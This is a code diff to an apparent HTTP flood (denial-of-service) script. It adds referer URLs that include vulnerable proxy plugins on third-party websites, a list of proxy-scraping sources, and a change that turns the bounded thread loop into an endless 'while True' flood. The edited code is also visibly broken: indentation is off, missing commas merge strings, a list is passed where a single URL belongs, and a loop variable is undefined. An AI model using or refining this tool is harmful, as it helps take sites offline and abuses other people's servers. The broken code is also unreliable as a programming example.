@@ -449,6 +449,64 @@ else:
      'https://add.my.yahoo.com/rss?url=',
      'https://play.google.com/store/search?q=',
      'http://www.google.com/?q=',
+    'http://www.alltheweb.com/help/webmaster/crawler',
+    'http://gais.cs.ccu.edu.tw/robot.php', 'http://www.googlebot.com/bot.html',
+    'https://www.yandex.com/yandsearch?text=', 'https://duckduckgo.com/?q=',
+    'http://www.ask.com/web?q=', 'https://www.fbi.com/',
+    'http://search.aol.com/aol/search?q=',
+    'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
+    'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
+    'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
+    'https://drive.google.com/viewerng/viewer?url=',
+    'http://www.google.com/translate?u=',
+    'https://developers.google.com/speed/pagespeed/insights/?url=',
+    'https://replit.com/', 'https://check-host.net/', 'https://obaspro.my.id/',
+    'http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
+    'http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=',
+    'http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
+    'http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
+    'http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
+    'http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=',
+    'http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
+    'http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
+    'http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url='
+    'http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url='
+    'http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=',
+    'http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
+    'http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS',
+    'http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
+    'http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
+    'http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url='
+    'http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=',
+    'http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=',
+     'http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=',
+    'http://growtopiagame.com/', 'http://check-host.net/check-http?url=',
+    'http://ip2location.com/', 'https://pointblank.com/',
+    'https://www.ted.com/search?q=',
+    'https://drive.google.com/viewerng/viewer?url=',
+    'http://validator.w3.org/feed/check.cgi?url=',
+    'http://host-tracker.com/check_page/?furl=',
+    'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
+    'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=',
+    'https://play.google.com/store/search?q=',
+    'http://jigsaw.w3.org/css-validator/validator?uri=',
+    'https://add.my.yahoo.com/rss?url=', 'http://www.google.com/?q=',
+    'https://www.cia.gov/index.html', 'https://www.google.ad/search?q=',
+    'https://www.google.ae/search?q=', 'https://vk.com/profile.php?redirect=',
+    'http://jigsaw.w3.org/css-validator/validator?uri=',
+    'https://add.my.yahoo.com/rss?url=',
+    'http://www.google.com/?q=',
+    'http://www.usatoday.com/search/results?q=',
+    'http://engadget.search.aol.com/search?q=',
+    'https://www.google.ae/search?q=', 'https://www.google.com.af/search?q=',
+    'https://www.google.com.ag/search?q=',
+    'https://www.google.com.ai/search?q=', 'https://www.google.al/search?q=',
+    'http://www.usatoday.com/search/results?q=',
+    'http://engadget.search.aol.com/search?q=',
+    'https://steamcommunity.com/market/search?q=',
+    'http://filehippo.com/search?q=',
+    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
+    'http://eu.battle.net/wow/en/search?q=',
      'http://regex.info/exif.cgi?url=',
      'http://anonymouse.org/cgi-bin/anon-www.cgi/',
      'http://www.google.com/translate?u=',
@@ -1379,8 +1437,14 @@ else:
                 except Exception:
                     sys.stdout.write(Fore.RED + '[+] The Host May Be DIE or Proxy DEAD !!!\n')
 
-
-    class MainLoop:
+ proxyResourca = [
+   'https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all',
+   'https://www.proxy-list.download/api/v1/get?type=http',
+   'https://www.proxyscan.io/download?type=socks5',
+   'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
+]
+                    
+     class MainLoop:
 
         def home(self):
             global Flood_Mode
@@ -1433,7 +1497,7 @@ else:
                         in_proxies = open('socks4.txt', 'r')
                     if choice == 'sock5':
                         socks5 = open('socks5.txt', 'wb')
-                        r = requests.get('https://api.proxyscrape.com?request=getproxies&proxytype=socks5&anonymity=elite')
+                        r = requests.get(proxyResourca)
                         socks5.write(r.content)
                         x = requests.get('https://www.proxy-list.download/api/v1/get?type=socks5&anon=elite')
                         socks5.write(x.content)
@@ -1446,7 +1510,7 @@ else:
             except:
                 pass
             else:
-                for i in range(num_threads):
+                while True:
                     try:
                         in_line = in_proxies.readline()
                         Requests(url, i + 1, in_line, choice, mode).start()
